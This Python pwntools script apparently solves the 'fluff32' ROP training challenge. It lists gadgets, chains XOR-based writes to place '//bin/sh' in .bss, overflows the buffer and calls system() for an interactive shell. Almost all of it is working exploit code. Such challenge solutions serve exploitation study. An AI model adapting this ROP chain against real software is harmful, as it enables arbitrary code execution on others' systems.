import pwn
from GizmoMaker import GizmoMaker
import sys


"""
0x8048674:  mov ebp, 0xcafebabe; ret;
0x8048674:  mov ebp, 0xcafebabe; ret; 
0x804867e:  mov edi, 0xdeadbabe; ret; 
0x8048684:  mov edi, 0xdeadbeef; xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret; 
0x804868c:  mov edx, 0xdefaced0; ret; 
0x8048686:  mov esi, 0xca87dead; pop ebp; mov edx, 0xdefaced0; ret; 
0x804866f:  nop; pop edi; xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret; 
0x8048685:  out dx, eax; mov esi, 0xca87dead; pop ebp; mov edx, 0xdefaced0; ret; 
0x804867d:  pop ebp; mov edi, 0xdeadbabe; ret; 
0x804868b:  pop ebp; mov edx, 0xdefaced0; ret; 
0x8048670:  pop edi; xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret; 
0x8048673:  pop esi; mov ebp, 0xcafebabe; ret; 
0x804867a:  pop esi; xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret; 
0x8048689:  xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret; 
0x804867b:  xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret; 
0x8048671:  xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret; 
"""

# write val to edx
# xchg edx, ecx; 0x8048689
# xor [ecx], bl; 0x8048696


# Write val (address) to edx
# 0x8048671:  xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;  # clear edx
# 0x80483e1:  pop ebx; ret;
# 0x804867b:  xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;


# 0x8048689:  xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret;  # swap edx with ecx
# 0x8048696:  pop ebx; xor byte ptr [ecx], bl; ret;  # xor value of

# increment write to edx by 1 for four times per write to actual address

binary = pwn.ELF("fluff32")
gizmo_maker = GizmoMaker(packer=pwn.p32)

template = {'name': 'write_to_edx',
            'Constants': ['Clear_edx', "pop_ebx", 'xor edx, ebx'],
            'Parameters': ['write_val'],
            'Queue': ['Clear_edx', 0x4a4a4a4a, "pop_ebx", 'write_val', 'xor edx, ebx', 0x4a4a4a4a]}

gizmo_maker.add_template(template)
gizmo_maker.init_template("write_to_edx", 0x8048671, 0x80483e1, 0x804867b)


write_template = gizmo_maker.get_template_template()
write_template["name"] = "write"
write_template["Constants"] = ["xchg_edx_ecx", "xor"]
write_template["Parameters"] = ["byte_to_write"]
write_template["Queue"] = ["xchg_edx_ecx", 0x4a4a4a4a, "xor", "byte_to_write"]

gizmo_maker.add_template(write_template)
gizmo_maker.init_template("write", 0x8048689, 0x8048696)


def write(giamo_maker, addr, value):
    bytes_to_write = bytes.fromhex(hex(value)[2:])
    payload = b''
    for i in range(0, 4):
        payload += gizmo_maker.execute("write_to_edx", addr + i)
        payload += gizmo_maker.execute("write", bytes_to_write[i])
    return payload


addr_to_write_to = binary.bss() + 8
system = binary.symbols[b'system']

payload = b''
payload += ('D'*40).encode()
payload += ('B'*4).encode()

# not super clean, but writing "//bin/sh"
payload += write(gizmo_maker, addr_to_write_to, 0x2f2f6269)
payload += write(gizmo_maker, addr_to_write_to + 4, 0x6e2f7368)


payload += pwn.p32(system)
payload += 'JJJJ'.encode()
payload += pwn.p32(addr_to_write_to)
payload += "\n".encode()
# print(payload)

p = pwn.tubes.process.process(["./fluff32"], shell=True)
p.send_raw(payload)
p.interactive()
p.close()
